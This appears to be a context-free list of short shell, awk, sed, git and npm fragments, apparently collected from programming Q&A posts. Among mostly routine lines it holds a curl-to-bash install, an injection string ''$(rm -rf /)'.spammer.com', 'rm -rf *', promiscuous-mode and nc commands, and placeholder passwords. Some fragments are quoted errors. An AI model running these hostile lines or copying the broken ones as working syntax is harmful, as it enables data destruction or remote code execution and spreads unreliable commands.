man mv
[[ -x ]]
[[ … ]]
for f in "$dir"/*; do [[ -x $f ]] && mv "$f" /tmp; done
tar -xvfo npmbox.npmbox
tar -xvf npmbox.npmbox
--cache-min 999999
/start/,/end/ action
-F, -v OFS=","
gsub("/"," ",$4); split($4,a,":")
cmd="date \"+%d %b %Y %H:%M\" -d \""a[1]" "a[2]":"a[3]" 6 hours \""; cmd | getline var
$date 6 hours
-f Tarfile
| zless
condition {commands}
./configure --with-http_dav_module --add-module=/path/to/the/above/module
/usr/local/bin/bash: No such file or directory
[[ $@ ]]
perl -ne 'print pack "B*", $_' input
adb logcat
adb logcat | grep
adb logcat -d
mv -f
find | xargs
ls -1 --color=never | while read X; do echo ${X}; done
ls *
sed -e
perl -lnpe
t again
t again
echo '$a'
echo "$a"
/pam_wheel.so use_uid/
| bash
| bash
xargs -n 2 mv
< tempA
cat tempA
" "
paste - FileB
git branches -a
grep xxx
branches=( $(git branch -a | grep $1) )
branches=$(git branch -a | grep $1)
script 'release-.*'
git branch -a --list pattern
-i inplace
declare -i k
installed modules
ls -t | head -1
ls -opts | read -r name; do...
ls -opts
read -d $'\0'
printf '%s\0'
sort -z
$(IFS=$'\n'; echo "${!arr[*]}" | sort -n)
-type f
npm install; growl
; p
&& p
awk '...' file > file
wmctrl -T master$$ -r :ACTIVE:
display image.png &
wmctrl -a master$$
$( )
expr: syntax error
exec ./s1.sh &
s1, s2, and s3
while read -r line; do... done <<< $(grep $srchterm $filename)
wc- l
wc --help
grep -c 'lion' file
"tr 'hi there' goodbye"
{"tr", "hi there", "goodbye"}
while true
C:\program files\.git
C:\program files\git\dev\null
./my_script author Knakis
--depth <depth>
set -x
rm --help
export PATH=$PATH;$HOME/bin
source  ~/.bash_profile
/Users/paul/.bash_profile:4: permission denied: /Users/paul/bin
ls -la $HOME/bin
export PATH=$PATH
cd "$DESTINATION_FOLDER"
cd $DESTINATION_FOLDER
eval cd "$DESTINATION_FOLDER"
eval printf %s
GNU coretutils
tail -f
sudo chown -R $USER /usr/local/lib/node_modules
sudo chown -R $USER:$(id -gn $USER) /Users/YOURUSERNAME/.config
npm i -g ionic
-mtime 6
-mtime -6
-mtime +6
> 1
>= 1
readlink -f ${0}
It works, thanks! How about if I want to replace 14th and 15th digit by 6th and 7th digit? –  Vision111
-f program-file
-e program-text
Sep 1
find . -maxdepth 1 -type f -daystart -mtime -1 ...
gcc -o harsha pos_of_rightmost_setbit.cpp
vi pos_of_rightmost_setbit.cpp
gcc -o harvightmost_setbit.cpp
PS1="\[\e[1;39m\][\u@\h \W]\$ \[\e[m\]"
source $HOME/.rvm/scripts/rvm
rvm 1.25.29 (stable) by Wayne E. Seguin <wayneeseguin@gmail.com>, Michal Papis <mpapis@gmail.com> [https://rvm.io/]
source ~/.scm_breeze/scm_breeze.sh
source ~/.scm_breeze/scm_breeze.sh
gphoto2 --capture-image-and-download
which python
sudo pip
which python
python -m pip uninstall pip setuptools
man bash
while read -r dat hour rest
secs=$(date -d"${dat//.//} $hour" "+%s")
[ $((secs - prev)) -ge 60 ] && echo "$dat $hour $rest"
while read; do ... done < file > output
read -r
printf "%q"
awk '...' file1 file2 tmp && mv tmp file2
if $CPU -gt 1
while(<>){...; print}
BEGIN {$/ = \1024}
s/FROM/TO/ .. undef
if $. == 1
dd bs=32k count=1 if=file.txt of="$tmpfile"
sed -i 's/FROM_STRING/TO_STRING/' "$tmpfile"
dd bs=32k if=file.txt of="$tmpfile" seek=1 skip=1
sort -R
grep -c ''
wc -l
grep -oP
<(..) <(..)
$(date +%N)
"s/$(cat jingle.img)/...
echo $array_value
[[ ... ]]
[[ ... ]]
echo x
${lastline: -1}
tail -n 1 $bc; echo x
"${lastline: -1}"
"${lastline: -1}" != $'\n'
echo >> $bc
kick the bucket
kick the bucket
date -d '20140826225834'
'invalid date'
YYYY/MM/DD HH:MM:SS
git diff
git diff
git diff
git diff
--word-diff=color --word-diff-regex='...'
delete a
my file.txt
my\ file.txt
-type f
-depth 1
shopts -s extglob
real  0m1.593s
real  0m3.628s
read -d $'\0;
" =
(?!").*(?=(" =))
grep -o '(?!").*(?=(" =))' input.txt
"an arbitrary string" = " =this is the text one"
grep -Po '^"\K.*?(?=(" =))'
-p $$
-d 1
-F n
sudo /bin/bash -c echo foo
sudo /bin/bash -c "echo foo && echo bar"
/bin/bash -c "echo foo && echo bar"
man sudoers
',', ':', '=' and '\'
/bin/bash -c "echo foo" "&&" "echo bar"
cmake test
linenr=$(grep -n -m 1 "SUMMARY OF POLARIZATION CALCULATION" <your file name here> | cut -d':' -f1)
let "lastlinenr = $linenr + 9"
cat <your file name here> | sed -n "$linenr","$lastlinenr"p > <your destination file here>
IND = '\x84'
NEL = '\x85'
yq -m
if git ls-remote ...; then
git ls-remote
make run
make run > output
make run
make run
make -s run > output
NUMPROCS={some number}
pidof program
grep "Elapsed Time" output
too many open files
out_var = "to screen"
out_var = "/dev/tty"
command1 > $out_var
db2 -tf firstscript.sql;db2 -tf firstscript.sql
bus info
declare -a
which matlab
echo "$PATH"
which matlab
echo "$PATH"
which matlab
bash myscript.sh
tcsh myscript.sh
sh myscript.sh
[ $# -ne 0 ]
[[ -n $BASH_ARGV ]]
\( -ipath '*/test/*' -o -ipath '*/notest/*' \)
-T -
(cd ... &&)
echo moo
man ssh
-t     Force pseudo-tty allocation. This can be used to execute arbitrary screen-based programs on a remote machine, which can be very useful, e.g. when implementing menu services.  Multiple -t options force tty allocation, even if ssh has no local tty.
echo "Hello log" | tee /dev/tty2 > /var/log/my_logs
= IOS
[ "$DEVICETYPE"
iPhone 2
iPad Mini
-maxdepth 1
ab, cd
chmod 755 /home/kemallin/Desktop/clean.sh
mv sample.txt work/
mv_cd file dest
mv_cd file1 file2 ... fileN dest
${@: -1}
cd `
cd ~
line continuation
n = 12
number > 99
grep 'master.+\)' inputfile.txt > outputfile.txt
4974 5105 4990 5006 5054 5070 5038 5022
find <some criteria> -exec echo "{}" \;
cat a >> a
cat a > b ; cat a >> b
cat a >> a
cat a >> a
>> a
>> a
echo filename | xargs md5sum
-type f
if [ -f ...
-exec ... +
-exec md5sum {} \;
-type f
-maxdepth 1
man awk
YYYY MM DD HH MM SS
06 08 2014 23 59 36
command substitution
process substitution
gsub("<d><e>[^0-9]*</e></d>", "", $3)
sed -e "s/Q/Qz/g"
sed -e "s/Qz/Q/g"
open some.pdf
echo $PYTHONPATH
NEW-1, operation successfully completed: /log/log_1/log_/log_3/log_4/log_5/
./a.out *
./a.out -f *
./a.out -rf *
./a.out "*"
./a.out *
man grep
xargs grep -l
grep -i
ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa -m pem <<< y
success -ne 1
-v FS=
'/^>/ {print; next}
{for (i=0;i<=NF/60;i++) {for (j=1;j<=60;j++) printf "%s", $(i*60 +j); print ""}}
awk --re-interval '..' file
./b.sh &
kill -SIGUSR1 PIDOFB
command1 && command2
command1; command2
cmd1 ; cmd2
cmd1 && cmd2
cmd1 && cmd2
(cmd1 && cmd2)
set -e
implicit call
exit $?
$(( ))
$(( ))
echo "$dir" | awk ...
-mtime +10s
10 seconds
shopt -s nullglob
|| exit 1
declare -p letters
declare -p number
echo "$number"
number=$((RANDOM % RANGE))
echo $i " "
git filter-branch
login shell
login shell
login shell
login shell
interactive shell
-v n=${num}
for pdb in ./Receptors
cd ..
mkdir ../thedir
item1=('item1' '1' '20')
item$itemnumber=('item2' '4' '77')
item$itemnumber=('item3' '17' '15')
grep -f
man grep
printf "'%s '" "$@"
addtoarray arr val1 "spaced val2"
not 1 and not 2
grep -i
ls -1dmb /bin/* | cat
ls -1dmb /bin/*
ls --color=auto
"$(ls ...)"
$(ls ...)
echo $(ls -1)
echo first_file; second_file
echo first_file second_file ...
/usr/bin/xlsx2csv #{excel_name}.xls >> #{excel_name}.txt
man xlsx2csv
export PATH=/Users/sychung/mongoDB/bin
sed 's#.*>\(.*\)\<version\.suffix\>#\1#'
$>fswatch . 'python manage.py test'
$>fswatch . | xargs -n1 program
$>fswatch . | xargs -n1 python manage.py test
$>fswatch . | xargs -n1 'python manage.py test'
xargs -0
fswatch -0
fswatch -o
fswatch . | (while read; do python manage.py test; done)
fswatch -r -o -e 'pyc' somepath | fswatch-do python manage.py test someapp.SomeAppTestCase
sudo -l -u postrges
-Wl,rpath=/lib1 -Wl,rpath=/lib2 -Wl,rpath=/lib3
echo $(date | tr ' ' '_')
<condition> { <action> }
while read
<expression> {code}
NR == 1
NR < 2
t == NR
t > NR
bash $ python py_script.py &
broken pipe
sort -z
sed -z
tail -f <file>|egrep -v "lol"
tail -f
kill %1
[ "$d" \> 2014-07-03 ]
perl wget.pl 2014-06-29 2014-07-03
ps aux|grep firefox
read -e -p
echo -e "$(tput setaf 7)my string here"
tput setab #
tput op
SELECT field[3] WHERE field[0] = "Charterish"
>(some command)
<(some command)
>(tee ./myscript.stdout >/dev/ps/9)
man bash
while [ "$inputString" != "bye" ]
lsof -p [pid]
tail -f /proc/[pid]/fd/[file-descriptor]
if else
tail -f
while read
tail -f
while read
tail -f
-n $line
< <(stat -c '%Z' "$file")
if $(grep --quiet "keyword" <<< $line)
type something
host $r.$i
host .1
javac: no source files
mkdir ./dummy
On/Off regardless, and included the
grep -ri --include *.txt --include *.html filename .
mtr --raw -c 1 google.com
* * *
/var/www/cgi-bin/echo.cgi: line 6: /dev/stdin: No such device or address
this: id*
cat file | grep "this: " | wc -l
sort -u
grep -c
column -t
bash /root/checkspace.sh
df -h /
tail -1
sed '/Filesystem/d'
man bash
readlink -m
help test
git push
git push && bash update_SERVER_A.sh
010000 - 019999
1 2 3 4
$(seq 4)
1 2 3 4
grep -w '^dm-7' file
man grep
NR%2 {a=$1; next}
$1>a {for (i=a;i<=$1;i++) print i}
i - 1
gnu awk
gnu awk
cd $mydir
cd $mydir/
FILES=$(ls -1 | sed -e 's/\..*$//')
ls | head -n 1
N>0 || n < 3000
command substitution
echo      1
negative lookahead
echo `ldapsearch -LLL -h ds389.some.org -p 389 -D "uid=someAdmin,o=some.org" -w SOMEpassWord -b "ou=People,o=some.org" -s sub '(&(RMailAliases=zzz)(!(RMid=d*)))' dn | grep dn: | wc -l`
echo $?
grep -c ^dn:
set -e
source ./sample.sh
if [[ 0 ]]
[[ 0 ]]
[[ -n 0 ]]
cat /tmp/f
echo "123" | cat
cat < <(echo 123)
-i ''
Git Bash
Git Bash
Command Prompt
awk '/Date/ {x=NR}; END{NR>=x && NR<=x+3} LOG_FILE
/^Date:/ {c=1; a=$0;next}
END{print a}
-v RS=
/^Date:/ {a=$0}
END{print a}
What I have done
{ print $0 }
$ [path_to_my_foler]/app/Console/cake
-bash: [path_to_my_foler]/app/Console/cake: Permission denied
sort -n -k2 file.dat | tail -1
[ -f "$DAEMON" ] || exit 0
[ -f "$DAEMON" ] || (exit 0)
someErrorProgram || (exit 0)
exit 0
{ ... }
-v par="CallTilEdb"
-v par="$1"
$1==par {sum+=$2}
END {print sum+0}
number +
0 8 + 16 + 4 + p
number + number + number
emacs &
import os
$\ = "\n"
perldoc perlrun
print ++$_
sed: -e expression #1, char 19: unterminated address regex
module .... (
"1969 years 12 months"
1969 year and 12 months
declare -A
printf %s\\n ...
grep -Fvx
printf %s\\n
printf '%s\n'
printf | grep
printf %s\\n "${databases[@]}"
b1706f0d-2cf1-4fd6-ab60-ae4d08608f1f 2014-09-15T07:30:00Z
b1706f0d-2cf1-4fd6-ab60-ae4d08608f1f 2014-09-15T09:30:00Z
2 hours
A11 A6 A5 A22 A21
grep { $_ ne "" }
t start
sed -r '/^< /!d; s/^<\s+//; /^$/d; /:/!{s/\S+\s+//; s/\s.*//; s/^/:STATUS: /}'
curl -s -D- -o/dev/null
curl -s -D- -o/dev/null "$SITE" | awk 'NR==1{print ":STATUS:",$2}7
find . -maxdepth 1 -type d
find -type f
sort -n
tail -1
echo $(find | sort | tail) $dirname
sort -t" " -k1,1 -n | cut -d" " -f2-
sh text.sh -t "This is my text"
case $opt
echo $subtitles
echo hello world
echo "hello world"
name="some_string" value="some_string"
cat file.txt|grep "value=\".*\""
exit 125
chpst -P
sed -i
sed -i[ext]
&& cp tmpfile filename && rm tmpfile
./test.py -s testserver -pw 90opl;./
' 90opl;,./ '
./: Is a directory
./test.py -s testserver -pw '90opl;./'
chmod u+x script.sh
echo $result
{print hdr": "$0}
declare -i
(( ))
./test.sh 500000 giantfile.txt
history -c
) followed by
followed by (any non
) ) [ as group 1] followed by
[so first
between quote after name=]  followed by ( any non
) followed by
<... name="bla_bla_bla"> ... <... name="other_bla_bla"> ...
<... name="bla-bla_bla"> ... <... name="other-bla_bla"> ...
sed '7q;d' Jy.dat
cut -c20-29
myvar=$(sed '7q;d' Jy.dat| cut -c20-29)
declare -n
make -p
# makefile (from 'Makefile', line xy)
make D[tab]
make DIR=
bash v4.3
declare -n ARRAY=$group
cat input.txt | awk 'BEGIN { print "ID;Item;Status;Stock" }; /yes/ { printf "%s;%s;%s;%s\n", $1,$2,$3,$4 }'
cat input.txt | awk 'BEGIN { OFS=";"; print "ID","Item","Status","Stock" }; /yes/ { print $1,$2,$3,$4 }'
curl -L http://install.example.com | bash
$(/usr/bin/env python3 deploy.py)
command1 > file1
echo 0 > foo
echo 0 >> foo
rvm get stable
cd /Users/me/.rvm/scripts
ls -al base
cd ..
ls -dal scripts
set -e
ifconfig eth0 promisc
nc -vs 192.168.11.1 -p 22 192.168.11.2 22
grep -m1 $ID csvfolder/* | wc -l 
wc -l
Input console is not available
trap 'echo 'Exiting...'; exit' SIGQUIT
git filter-branch
$(echo $old_email)
cat foobar
git filter-branch
npm install prompt
npm install prompt -g
npm list --depth=0
npm list -g --depth=0
brew remove npm
brew remove node
npm list -g
export PATH=~/dotfiles/bin:$PATH
npm config get prefix
{executing directory}/node_modules
mocha test.js
node test.js
source /Library/Frameworks/Python.framework/Versions/3.4/bin/virtualenvwrapper_lazy.sh
sudo apt-get install python-pip python-dev build-essential
sudo pip install virtualenv virtualenvwrapper
sudo pip install --upgrade pip
sudo apt-get install vim
vi .bashrc
enter [Shift] + [g] //G (shift + g): to go the end of the file
enter [a] //Type a to edit the file
export WORKON_HOME=~/virtualenvs
export VIRTUALENVWRAPPER_PYTHON=[link-to-python-folder]
source /usr/local/bin/virtualenvwrapper.sh
export VIRTUALENVWRAPPER_PYTHON=/user/bin/python3
export VIRTUALENVWRAPPER_PYTHON=/user/bin/python
enter [Esc] then :wq
source ~/.bashrc
mkdir -p $WORKON_HOME
mkvirtualenv your_project
 workon your_project
source ~/.bashrc
sudo pip install virtualenv virtualenvwrapper
set -x
set -x
cat -v
sed s/^M//g
cat -v
echo -n '4869205468657265' | xxd -r -p | openssl dgst -sha512 -mac HMAC -macopt hexkey:0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b
echo -n "$value" | xxd -r -p | openssl dgst -sha512 -mac HMAC -macopt hexkey:$key
man rev
export PATH=~/dotfiles/bin:$PATH
npm config get prefix
{executing directory}/node_modules
< >
<replace this bit>
$PATH: $ANDROID_SDK
grep -E
Bash 3.2.25
"echo foo"
echo $4
ping -c1 $ip &>/dev/null && sleep 1 && echo "$ip is up" || sleep 1 && echo "$ip is down"
result=$( b.sh )
program < filename
cat filename | program
for device in *.txt
sed 's/search/replace/' file
sed 's/search/replace/g' file
Press any key to continue
echo \r
kill $$
kill $$
exit 1
run cp -pf "/folder/to/my/db" "/Library/Application Support/app/db
run() { $*; code=$?; [ $code -ne 0 ] && echo "command [$*] failed with error code $code\nERROR: $@\n"; }
{ ...; }
chmod +x pyscript.py
strace -p $PID
#!/usr/bin/env python -m trace --trace
chmod u+x nameOfScript
#! /bin/ksh
sleep 123
sleep 123
set -e
echo "foo"
SHELL GRAMMAR
set -e
set -e
echo "foo"
set -e
set -e
true && false && true
input is null
int main()
void foo(int i,...);
java test < textfilename
input is null
System.out.println("input is null");
java test textfilename
- - - Cookie=
- -
command | command2
set -o pipefail
vagrant up
vagrant provision
git add .
git commit -m "txt"
git add .
{} \;
-exec sh -c "..."
wc -l
if / else
man wc
wc -l
command | wc -l
if [ $(command | wc -l)  -ge 1 ]
-exec sh -c
cat /tmp/findtest
echo "$f"
rm /tmp/findtest
set -C
#$ -t 1-$[numModels]
qsub submit.sh
echo $clientConfig
-t tty
Cleaning up
"description": "Cleaning up"
"description": "Ingest"
export ar=(1 2 3 4)
sed -i -e 's/:/":"/g'
setfacl -R -m u:www-data:rwx -m d:u:www-data:rwx app/cache
setfacl -R {"-m ","-m d:"}u:www-data:rwx app/cache
setfacl: Option -m: Invalid argument near character 1
echo setfacl -R {"-m d:","-m "}g:deploy:rwx . | source /dev/stdin
echo string >> file
od -A n -t o1 -v input.txt | rs 0 1
| while read n; do
[ $n -eq 015 ] &&
read n
&& continue
printf "\\$n"; done
./script-c-b-ratio.sh: line 14: 3.24*4.78: syntax error: invalid arithmetic operator (error token is ".24*4.78")
to get n items a time from the list
[ "$#" -gt 0 ]
-d '\0'
sh myShellScript.sh
screen -S YOURUNIQUENAME -m THESCRIPTABOVE.sh
screen -x YOURUNIQUENAME
foo bar
for path in $glob
Control-a, d
screen -a
NEW_STUFF KEY2="VALUE2",KEY3="VALUE3" this is the end of line.
this is the end of line.
awk 'BEGIN{RS="<<<<<<o01o>>>>>>";FS="\n"};{system("banner " $2); for(i=8;i<NF;i++) print $i; system("read i;clear")}' auto_contract_data1.txt
awk 'BEGIN{RS="<<<<<<o01o>>>>>>";FS="\n"} /CLAUSEID/{system("banner " substr($2,10)); for(i=8;i<NF;i++) if(i==8) print substr($i,8);else print $i; system("read i;clear")}' auto_contract_data1.txt
banner $2
/home/orders/good.php -> -home-orders-good.php
-P -S -G
a = 1
sh -c
bash -c
if then
find grid -print
find command
s/a/A/; s/c/C/; s/n/N/;
control + C
source ~/.bash_profile
cp ~/.bash_profile bashprofile.txt
command + slash
source ~/.bash_profile
for ws in "${workspaces[@]}"
for e in "${hostnames[@]}"
find /path/path -type d -exec chmod 755 {} \;
find /path/path/ -type f -exec chmod 644 {} \;
[[ == ]]
[[ ]]
[ "$a" = "abc" ]
set -x
find '/var/adm/logs/morelogs/*' -type f -prune ' -name "*.user"' -print
chmod +x script
DOS EOL
echo ""
help read
"foo bar baz"
script where_to_search output
echo 639 | perl ...
grep -o .
fold -w1
paste -sd+ -
(tidy -asxml input.xml | xmllint --xpath 'descendant-or-self::*[starts-with(text(), "Aktiv tid:")]/following-sibling::*/text()' -) 2>/dev/null
<div class='contentcontainer'>
ls -A
ls -A
ls -A
for /?
if /?
python ./x.py
illegal option --t
stdbuf -i0 -o0 -e0 ./speak.pl | stdbuf -i0 -o0 -e0 ./wrapper.pl
phantomjs myAwesomeScript.js "www.example.com"
npm install -globabl phantomjs
<?php exec("phantomjs $scriptPath $arguments");
sort -n -k9
cmd $number
echo %s + 1 | bc
find /vol1/
cd "../$name"
qdel 11763*
illegally formed job identifier
perl -MCPAN -e 'install "Module::Name"'
cd /
cd -
cd /|vim
cd /|vim
| sort | uniq | wc -l
      zip -@ foo
-O, --to-stdout
tar -O
man chmod
-sw "%{http_code}"
--include (-i)
--write-out (-w)
--silent (-s)
process substitution
chmod 755 <script>
tail -+$position
24: ${Command}: ambiguous redirect
No such file or directory
'bash -s' -- < ${Command}
bash: bash -s: command not found
source <(cmd)
sudo apt-get install application
apt-get install
man apt-get
cd "$dirname"
sed '/^$/d'
do shell script "/Applications/Firefox.app/Contents/MacOS/firefox -ProfileManager &> /dev/null &"
/bin/bash/osacompile -
ln -s
hist -> hist
source ~/bin/.bash_profile
ln -s
ln -s
man ln
'%i 1 0 0 %w %h'
/usr/bin/sv up mongodb
btn - primary
btn - sm
grep -iE "apple\b" fruits.txt
grep -i '^apple$' fruits.txt
grep -iE 'apple\b' fruits.txt | grep -v "-"
"And at last 0"
awk -W version
awk '$2 ~ /^.b/' columns.txt
items=$(wc -l file.txt)
$(( $processed * 100 / $items))
filenames='cat file_list'
tr -cd ' ' <temp_list | wc -c
tr ' ' '\n' < file
ssh user@host program_in_env.sh
name 1
name 2
name 1
name 2
sort -k2
cmp --silent $old $new  && echo " Files are identicals " || echo "Files are different"
if CMD1 || CMD2 || CMD3
'$i' -eq 's1'
"$i" -eq 's1'
Etan Reisner
sudo -v
foo BAR=[TAB][TAB]
foo [TAB][TAB]
foo BAR=[TAB][TAB]
bar 1 BAR=
'$(rm -rf /)'.spammer.com
printf %q
[[ ... ]]
customcmd ...
echo $PATH >>/tmp/path.txt
echo $PATH >/tmp/path.txt
$ runhaskell count.hs
1 2 3 4 5 6 7 8 9 10
cd command
cd ......
. ~/.bashrc
. ~/.bashrc
source ~/.bashrc
source ~/.bashrc
/set opt(cbr_rate_DL)/
-exec \+
grep $'xxx\nxxx' file
wc -l
find … -mtime
filter = [ "a/.*/" ]
filter = [ "a\/sda1\/", "a\/sdb\/", "r/\.\*\/"]
sed -i -r 's/\s+filter\s=.*/'filter = [ "a\/sda1\/","a\/sdb\/", "r/\.\*\/"]'/' conf
word1 word2
"some content\n"
grep -Eo '\w+|[^\w ]' file
grep -Eo
grep [f]fmpeg
ffmpeg -a foo -b bar ...
less ffmpeg-manual.txt
vim notes-on-ffmpeg-commands.txt
$( ... )
pgrep -f
[ and
read -n1
-i 'defaultVal'
good bye
sprintf(command, "mycommand with password='$passw\'ord'");
-1 'a b c' -1 'koko d e > f'
> f
ruby -v
passwd --expire --inactive 1
read -s
N non-number chars + N numbers
{print $0}
declare -a LINES=($(...))
[[ ... ]]
shopt -s extglob
bash 3.2.51(1)
zsh 5.0.2
echo $unformattedtime | awk '{print substr($0,1,8)}'
tr -s [] '' < timet.txt > timetformat.txt
tr -s
tr -d '[]'
chmod 750 /home/myuser/secret
groupadd secret_users
chown -R :secret_users /home/myuser/secret
set -e
set -e
unset -e
set -e
unset -e
set -e
set -e
set -e
IFS=$',' read x y z <<< $n
2 4 6
x = he\\llo
x = he\llo
printf %q
echo -e
alias die_memcached_die="ps -ef | awk '/memcached/ && !/awk/ {print $2}' | xargs kill -9"
ps -ef | awk '/memcached/ && !/awk/ {print $2}' | xargs kill -9
/home/cpmove-XXXXX.tar.gz is not a directory
DONE MOVING
man pcre
sleep 123
sleep 123
sleep 123
(my_script &> /dev/null &)
sleep 123
set -x
date -r
"$@" &
kill -0
<(tr , " " <Parameter)
input text
echo $1
> $1.pos
2> /dev/null
dialog --stdout --print-version
cp -r /a1/*/O ~/O
#20 17 03 45 * root bash /media/data/loop.sh
377 330 377 340
find . -type f
tr '\n' '\0'
xargs -0 YOUR_PROGRAM
screen -ls
screen -r pid
./cherrypicker.sh input.txt
result=$(printf "%e" ${number})
var=$(awk 'some code')
/^2014/ {}
if (f) {for (i=1;i<=var;i++) print data[i]}
{f=0; delete data; var=0}
/my-pattern/ {f=1}
SSHKEYPASS=randpass 10
randpass function
process substitution
condition { action }
NSString *buildVersion = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"BUILD_VERSION"];
document 001
var="${var/-/ }"
[[ ... ]]
${BASH_REMATCH[1]} ${BASH_REMATCH[2]}
grep '_version='
sed -i
node --version
nodejs --version
ls -t -r -d foo bar baz
pstree -p 6947
Question 1. Why do I have to set $SIG{CHLD} to IGNORE in this situation?
Question 2. How do I make sure that if I need to kill sh(6949) that all of its children will be killed as well?
Question 3. How can I use fork along with system or exec to spawn external programs and have control over their termination without leaving orphans to init?
read line_from_1 && read -u 3 line_from_2
modulus(%) operator
awk '{printf "%s%c", $0, (NR % 4)?" ":"\n"}; END{print ""}' infile >outfile
awk '{printf "%8s%c", $0, (NR % 4)?" ":"\n"}; END{print ""}' infile >outfile
\(blah blah\)
budget >coorr
budget <coorr
new text
$(subst commoncmdsyntax,new text,$$desc)
Whited00r 7.1 OTA
!/=/{m=$0; next}
m{$0=$0 FS m; m=0}
cmdTest ls -l
ls -l:  Command not found
grep "foo" file.txt
echo "foo not found" would run. An attempt to pass the entire
cmdTest grep "foo" file.txt
grep "bar"
executor.execute(commandLine, new DefaultExecuteResultHandler());
[ ]
[[ ! -n $1 ]]
[[ -z "$1" ]]
ls -l
) to the
find /other/projects -size -100M
-type f
end time
date -d "date string" +%s
current time
end time
5 seconds
current time
clean average
outlier.sh input_file output_file
[11:55:43] [Server thread/INFO]:
[11:55:43] [Server thread/INFO]:
echo test\[12\]/*
echo test[12]/*
echo test[12]/*
echo "test[12]/*
echo "test[12]/*"
alias ll="ls -la"
IPv4 networks should have as short subnet-mask as possible.
chown +x
chown u+rx
svn status -u -q
-name *
-type f
bash -c
{} +
bash -c script
bash -c
bash -c
as the search string for
"ls -lh $HOME"
"ls -lh *"
explain 'ls -lh *'
explain 'ls -lh *'
/:sp */
/:sp */
$0 ~ ":"sp" *"
pattern {action}
/:27018 */
/:sp */
":"sp" *"
" *"
$0 ~ ":"sp" *"
runuser -l  userNameHere -c '/path/to/command arg1 arg2'
runuser -l miner -c 'screen -S Mine -p 0 -X eval 'stuff "pwd"\015''
-bash: screen -S Mine -p 0 -X eval stuff: No such file or directory
if [ $ELAPSED -ne $PREVIOUSTIME "]"
if [ $ELAPSED -ne $PREVIOUSTIME ']'
sort -n
echo $PWD | sed 's:/\(.\)[^/]*/:/\1/:g'
read -rd/
echo -n
hello im martin
wc -l file.txt
[[ ]]
-n 2
awk 'BEGIN{x=0}{if(NR>1){x=1;exit}}END{if(x>0){print FILENAME,"has more than one line"}else{print FILENAME,"has one or less lines"}}' file.txt
if [ `wc -l file.txt` -ge "2" ]
if [ `cat file.tex | wc -l` -ge "2" ]
| curl $link | egrep 'PATTERN' | for image in ``sed -e "s/PATTERN/\\1/"`` do wget $image -P "\\$username\\$gallery";done
echo $1
set -x
$( )
echo '$d'
echo "$d"
sed '...' file > newfile
grep -n
tail -n1
(see below)
"Just add $TODAY to the for loop"
I changed the elements in the array btw
echo -n
echo -e
git log --merges --grep="pull request" --pretty=format:"[%h] %s %b" [SHA]..HEAD
awk '{$2=$3=$4=$6=$7=""; gsub(/ +/," ",$0); $2=$2 ":"; print}'
paste -sd,
-b 2048 -h
-h -b 2048
[[[-f file ] [-i]] | [-h]]
[-f file] [-i]
./FFmpeg-Android.sh: line 26: export:
export CC=arm-linux-androideabi-gcc
cd junk; rm -rf *
%,',"",,\user, \tan
echo -e
$' '
$' '
function func()
man printf
rm  xyz.png
mv abcd.png
mv abcd.png xyz.png
Server started
a[$2] = ...
X B C D E
a["B"] = "C D E"
Z B
print a["B"]
C D E
gawk --version
man bash
help if
rdesktop -u offsec -p ******** 192.168.***.***"
ls -l | wc
ls -l
man wc
ls -l | wc
3   7   15
ls -l
ls -l
printf %q\\n "$OUTPUT_FILE"
echo "$OUTPUT_FILE" | cat -v
for ((c=2;c < $numWordsInLine; c++)); do
{andrea,georges ...
read -e -p
L 50 CA
man bash
mydir=( "${arr[@]}" )
params=( "$@" )
cp ./meta-000xx ./directory
./view.sh "$@";;
s/^ *//
s/ *$/
s/  */\n/g
log2csv Red1_1.log
log2csv *.log
log2csv *.log
log2csv test1.log
log2csv *.log
shopt -s nullglob
tr '\n' ','
find . -maxdepth 1
find ./* -maxdepth 0
bash --login -i
bash --login -i --rcfile=C:/Cygin/home/%USERNAME%/.bashrc
grep -f file1 file2 file3
cat -n
unary operator expected
xargs -n N
man xargs
find ./ -exec bash -c 'mv 2 2_re' \;
mv: cannot stat ‘2’: No such file or directory
sort -r
process substitution
#!/usr/bin/env bash
" blabla <!--
-Dlogin=Admin Admin
env -i cmake
syntax error near unexpected token 'newline'
myFile.txt >> otherFile.xml
name="value with spaces in the middle"
awk { print $3 }
bash -ex ./test.sh
bash -x
git tag
perl -e
find . -name "*" -print
find . -print
-name "*"
userA@LocalA$ ssh userD@RemoteDestinationD
alias l='ls -laH'
alias l?='alias l'
? l
alias \?=alias
complete -a \?
set -f
find ... -print0
my @values = map { ... } split '/', (split)[-1];
$1, $2
@values = map { /.(\d+)(\w+)/; $1, $2 } @array
-F"  "
BIN=$(echo "obase=2; ibase=16; $i" | bc )
1000 0010 0000 1111......
$F[$i] . $F[$i+1]
test -s
test -s
./ipGatewayCheck.sh: line 13: [: missing
test1 test2 test3 test4
for i in {1..4}; do x$i=$(wc -l < test$i); done
x1=10: command not found
x2=9: command not found
x3=9: command not found
x4=9: command not found
wc -l
man date
Insert Statement
Last Line
Last Line
-- data_table
xargs -nX
mysql -D ${VAR4} -pPassword <<EOF
mysql -D ${VAR4} -pPassword <<EOF
mysql -D ${VAR4} -pPassword <<EOF
ps -ef | grep <script_name>
ps --ppid $PID
(?<=-pname )
[^ ]*
[^ ]+
sed 's/^inetnum: *//;s/^ -//'
tail -f _make.log
[ $? -eq 0 ]
[ $? = 0 ]
wait %%
line 3: ${f,.fastq,.bam}: bad substitution
-j (number of parallel jobs)
vagrant ssh
ps -p $$
ps -p $$
cat /etc/shells
sudo apt-get update
sudo apt-get install zsh
cat /etc/shells
which zsh
zsh --version
zsh 5.0.2 (x86_64-pc-linux-gnu)
chsh -s $(which zsh)
source .zshrc
tree /usr/share/zsh/
source .zshrc
ps -p $$
exec zsh
-k value
filename with a space
cp a b c
eval na2=\$$OPTIND
exec "python myscript.py --input=/path/file --someOption=value"
bash script.sh
secs = hours * 60 * 60 + mins * 60
Press Enter for confirm or enter a new value or <something> for exit>
-i value
printf -v variable
read -i
$git diff origin/master..master --name-only
file_name = ARGV[0]
ruby your_program.rb path/to/file_name.csv
git tag
tail -1
exec mysql -uuser -ppassword -e'create database databaseName;'
exec [-a NAME] [-cl] [COMMAND] [ARG...] [REDIRECTION...]
mkdir /etc/RCS
[ ! -d $BPATH ] && mkdir -p $BPATH || :
mkdir -p "$bpath" 2>/dev/null
sh "/media/Compartido/Juegos/Emuladores & Roms/MS-D.O.S/Aladdin"/Iniciar
